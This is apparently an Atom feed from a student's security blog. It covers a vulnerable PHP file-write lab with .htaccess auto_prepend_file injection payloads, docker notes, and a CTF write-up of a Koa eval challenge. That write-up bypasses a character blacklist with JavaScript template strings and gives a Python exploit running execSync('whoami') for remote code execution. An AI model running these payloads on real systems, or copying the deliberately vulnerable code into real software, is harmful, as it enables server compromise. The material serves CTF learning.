<span class="comment"># 将rain添加至用户组www-data，方便写入文件</span></span><br></pre></td></tr></table></figure><h2 id="写入-htaccess"><a href="#写入-htaccess" class="headerlink" title="写入.htaccess"></a>写入.htaccess</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;write&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">    <span class="variable">$write</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;write&#x27;</span>] . <span class="string">&quot;\nhello world&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$name</span> . <span class="variable">$write</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>; </span><br><span class="line">    <span class="keyword">echo</span> file_put_contents(<span class="variable">$name</span>, <span class="variable">$write</span>); </span><br><span class="line">&#125; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/?name=.htaccess&amp;write=php_value%20auto_prepend_file%20info.php%0d%23%5c</span></span><br><span class="line"><span class="comment">error</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/?name=.htaccess&amp;write=php_value%20auto_prepend_file%20info.php%0a%23%5c</span></span><br><span class="line"><span class="comment">success</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/?name=.htaccess&amp;write=php_value%20auto_prepend_file%20info.php%0d%0a%23%5c</span></span><br><span class="line"><span class="comment">success</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/?name=.htaccess&amp;write=php_value%20auto_prepend_file%20info.php%0a%0d%23%5c</span></span><br><span class="line"><span class="comment">success (double newline)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/?name=.htaccess&amp;write=php_value%20auto_prepend_file%20info.php%20%23%5c</span></span><br><span class="line"><span class="comment">error</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">使用docker的ubuntu镜像搭建一个lamp环境</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
    <category term="docker" scheme="https://r4in1.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>docker学习笔记</title>
    <link href="https://r4in1.github.io/2020/11/29/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://r4in1.github.io/2020/11/29/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-29T02:19:24.000Z</published>
    <updated>2020-12-02T03:26:33.327Z</updated>
    
    <content type="html"><![CDATA[<p>docker一些常用的命令以及使用方法</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">docker images <span class="comment"># 列出已加载的镜像</span></span><br><span class="line">docker pull ubuntu <span class="comment"># 获取镜像（默认最新版，可加:1.1.1获取特定版本）</span></span><br><span class="line">docker search httpd <span class="comment"># 搜索镜像</span></span><br><span class="line">docker ps -a <span class="comment"># 列出所有容器的状态，不加-a为列出正在运行的容器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- run docker ------------------------------</span></span><br><span class="line">docker run -it ubuntu /bin/bash <span class="comment"># 启动一个容器（同时进入容器命令行）</span></span><br><span class="line"><span class="comment"># 参数说明：-i 交互模式，-t 终端，ubuntu 使用ubuntu镜像，/bin/bash 执行的命令（获取一个交互式的shell）</span></span><br><span class="line">docker run -itd --name myUbuntu ubuntu /bin/bash <span class="comment"># 后台启动一个容器（不会进入容器的命令行）</span></span><br><span class="line"><span class="comment"># 参数说明：-d 后台运行，--name 为容器命名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- manage containers -----------------------</span></span><br><span class="line">docker start &lt;容器id/容器名字&gt; <span class="comment"># 启动一个已停止的容器</span></span><br><span class="line">docker stop &lt;容器id/容器名字&gt; <span class="comment"># 停止一个正在运行的容器</span></span><br><span class="line">docker restart &lt;容器id/容器名字&gt; <span class="comment"># 重启一个容器</span></span><br><span class="line">docker rm -f &lt;容器id/容器名字&gt; <span class="comment"># 删除一个容器，-f参数为强制删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -- enter containers ------------------------</span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;容器id/容器名字&gt; /bin/bash <span class="comment"># 推荐使用，退出不会停止容器</span></span><br><span class="line">docker attach &lt;容器id/容器名字&gt; <span class="comment"># 退出会停止容器</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="使用docker创建web应用"><a href="#使用docker创建web应用" class="headerlink" title="使用docker创建web应用"></a>使用docker创建web应用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8848:5000 training/webapp python app.py</span><br><span class="line"><span class="comment"># 当本地不存在该镜像时，docker会自动下载该镜像</span></span><br><span class="line"><span class="comment"># -p参数为端口映射，将容器的5000端口映射到主机的8848端口上</span></span><br><span class="line"><span class="comment"># -P内部端口随机映射到主机的一个端口上</span></span><br><span class="line"><span class="comment"># python app.py为执行的命令，即启动flask服务</span></span><br><span class="line"></span><br><span class="line">docker port &lt;容器id/容器名字&gt; <span class="comment"># 查看一个容器的端口映射情况</span></span><br><span class="line">docker logs -f &lt;容器id/容器名字&gt; <span class="comment"># 查看容器的日志，-f可以使该命令已知执行</span></span><br><span class="line">docker top &lt;容器id/容器名字&gt; <span class="comment"># 查看容器内部运行的进程</span></span><br></pre></td></tr></table></figure><h3 id="创建目录映射"><a href="#创建目录映射" class="headerlink" title="创建目录映射"></a>创建目录映射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8848:80 -v c/Users/R4in1/Docker/lamp/:/var/www/ ubuntu /bin/bash</span><br><span class="line"><span class="comment"># 将容器的/var/www目录映射到主机的C盘Users/R4in1/Docker/lamp目录</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">关于docker的使用方法以及学习记录</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    
    <category term="docker" scheme="https://r4in1.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>关于Javascript模板字符串</title>
    <link href="https://r4in1.github.io/2020/11/28/%E5%85%B3%E4%BA%8EJavascript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://r4in1.github.io/2020/11/28/%E5%85%B3%E4%BA%8EJavascript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-11-28T13:00:09.000Z</published>
    <updated>2020-11-30T02:46:51.904Z</updated>
    
    <content type="html"><![CDATA[<p>今天打算使用docker复现一下前一段时间校赛的题目，算是复习知识点并学习使用docker</p><p>来源：校赛华为杯决赛题目</p><h2 id="KOA2"><a href="#KOA2" class="headerlink" title="KOA2"></a>KOA2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull node</span><br><span class="line">docker run --name koa -it -p 2020:80 node /bin/bash</span><br></pre></td></tr></table></figure><p>进入容器后先安装koa以及一些需要用到的模块和常用的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir node</span><br><span class="line"><span class="built_in">cd</span> node</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line">npm i koa</span><br><span class="line">npm i koa-router</span><br><span class="line">npm i koa-bodyparser</span><br><span class="line">npm i fs</span><br><span class="line">apt update &amp;&amp; apt upgrade</span><br><span class="line">apt install nano</span><br></pre></td></tr></table></figure><p>写入源码并启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nano app.js <span class="comment"># 将源代码复制到文件中</span></span><br><span class="line">node app.js <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure><p>此时访问localhost:2020可以看到服务已经启动了</p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>题目源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Parser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">let</span> router = <span class="keyword">new</span> Router();</span><br><span class="line"></span><br><span class="line">app.use(Parser());</span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    ctx.response.body = <span class="string">`&lt;html&gt;&lt;a href=&quot;/src&quot;&gt;Source Code&lt;/a&gt;&lt;/html&gt;`</span>;&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> btoa = <span class="function"><span class="params">s</span> =&gt;</span> <span class="keyword">new</span> Buffer(s + <span class="string">&#x27;&#x27;</span>).toString(encoding=<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> atob = <span class="function"><span class="params">s</span> =&gt;</span> <span class="keyword">new</span> Buffer(s + <span class="string">&#x27;&#x27;</span>, encoding=<span class="string">&#x27;base64&#x27;</span>).toString();</span><br><span class="line"><span class="keyword">const</span> src = btoa(fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>));</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    ctx.response.body = src;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">let</span> filter = <span class="function"><span class="params">expr</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> blacklist = [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27; &#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> ele <span class="keyword">of</span> expr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (blacklist.includes(ele))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">&#x27;/expr&#x27;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> expr = ctx.request.body.expr || <span class="string">&#x27;8 ^ 1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!filter(expr)) &#123;</span><br><span class="line">        ctx.response.body = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ctx.response.body = <span class="built_in">eval</span>(expr);</span><br><span class="line">&#125;)</span><br><span class="line">app.use(router.routes());</span><br><span class="line">app.listen(<span class="number">9999</span>); <span class="comment">// 复制源码时改成自己想要的的端口，比如80</span></span><br></pre></td></tr></table></figure><p>当时写这道题目当时没有写出来，后来看到RL的题解，考点是javascript模板字符串</p><p>可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings</a></p><p>总之大概就是反引号包裹的字符串可以嵌入表达式，并且可以用反引号代替括号调用函数</p><p>举个栗子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">let</span> r1 = <span class="string">&#x27;return arg1&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> r2 = <span class="string">&#x27;return arg2&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r1&#125;</span>arg2`</span>(<span class="string">&#x27;this is text1&#x27;</span>,<span class="string">&#x27;this is text2&#x27;</span>)); <span class="comment">// this is text1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r2&#125;</span>arg2`</span>(<span class="string">&#x27;this is text1&#x27;</span>,<span class="string">&#x27;this is text2&#x27;</span>)); <span class="comment">// this is text2</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r1&#125;</span>arg2`</span><span class="string">`text1<span class="subst">$&#123;b&#125;</span>text2`</span>); <span class="comment">// [ &#x27;text1&#x27;, &#x27;text2&#x27; ]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span><span class="string">`arg1<span class="subst">$&#123;r2&#125;</span>arg2`</span><span class="string">`text1<span class="subst">$&#123;b&#125;</span>text2`</span>); <span class="comment">// 2333</span></span><br><span class="line"><span class="comment">// 解析：</span></span><br><span class="line"><span class="comment">// `text1$&#123;b&#125;tex2` 返回结果为一个数组[ &#x27;text1&#x27;, &#x27;text2&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `$&#123;b&#125;text2` 返回结果为一个数组[ &#x27;&#x27;, &#x27;text2&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `text1$&#123;b&#125;` 返回结果为一个数组[ &#x27;text1&#x27;, &#x27;&#x27; ]和变量b</span></span><br><span class="line"><span class="comment">// `` 返回结果为一个数组[ &#x27;&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Function()函数用于构造匿名函数，将最后一个参数的值作为函数体，前面的参数值作为匿名函数的参数名</span></span><br><span class="line"><span class="comment">// Function(&#x27;arg1&#x27;, &#x27;arg2&#x27;, &#x27;return arg2&#x27;)构造匿名函数，等同于function(arg1, arg2)&#123;return arg2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Function()函数的第一个参数还可以是数组，结果为将数组中的每一个元素作为匿名函数的参数名</span></span><br><span class="line"><span class="comment">// 即Function([ &#x27;arg1&#x27;, &#x27;arg2&#x27; ], &#x27;return arg2&#x27;)也起到同样的作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 因此Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2`将返回一个匿名函数</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2`(&#x27;this is text1&#x27;,&#x27;this is text2&#x27;)将返回字符串&#x27;this is text1&#x27;</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;&#x27;return arg1&#x27;&#125;arg2``text1$&#123;tmp&#125;text2`将返回数组[ &#x27;text1&#x27;, &#x27;text2&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Final</span></span><br><span class="line"><span class="comment">// Function`arg1$&#123;tmp&#125;arg2```构造并调用匿名函数，函数体为变量tmp的值，可接受两个参数arg1和arg2</span></span><br></pre></td></tr></table></figure><h3 id="final-payload"><a href="#final-payload" class="headerlink" title="final payload"></a>final payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rr</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:2020/expr/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;expr&#x27;</span>: <span class="string">&#x27;Function`arg$&#123;ctx[`request`][`header`][`h`]&#125;arg2```&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = rr.post(url=url, headers=headers, data=data)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">// res: root</span><br></pre></td></tr></table></figure><p>关于<code>ctx</code>：<a href="https://www.cnblogs.com/lfri/p/11936231.html">https://www.cnblogs.com/lfri/p/11936231.html</a></p>]]></content>
    
    
    <summary type="html">从一道题学习Javascript模板字符串</summary>
    
    
    
    <category term="CTF" scheme="https://r4in1.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://r4in1.github.io/categories/CTF/WEB/"/>
    
    
    <category term="javascript" scheme="https://r4in1.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://r4in1.github.io/2020/11/23/hello-world/"/>
    <id>https://r4in1.github.io/2020/11/23/hello-world/</id>
    <published>2020-11-23T08:51:39.352Z</published>
    <updated>2020-12-02T10:07:53.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hello"><a href="#Hello" class="headerlink" title="Hello"></a>Hello</h1><p>你好，欢迎来到R4in1’s Blog.</p><p>本人大三狗一枚，可能会偶尔分享一些信息安全方面的知识。</p><p><img src="https://i.loli.net/2020/12/02/eymZfANBkTcHSrl.jpg" alt="pic"></p><a class="btn-beautify button--animated " href="https://R4in1.github.io"   title="R4in1"><span>R4in1</span></a>]]></content>
    
    
    <summary type="html">Hello World! This is R4in1&#39;s Blog. Welcome!</summary>
    
    
    
    <category term="MIX" scheme="https://r4in1.github.io/categories/MIX/"/>
    
    
  </entry>
  
</feed>
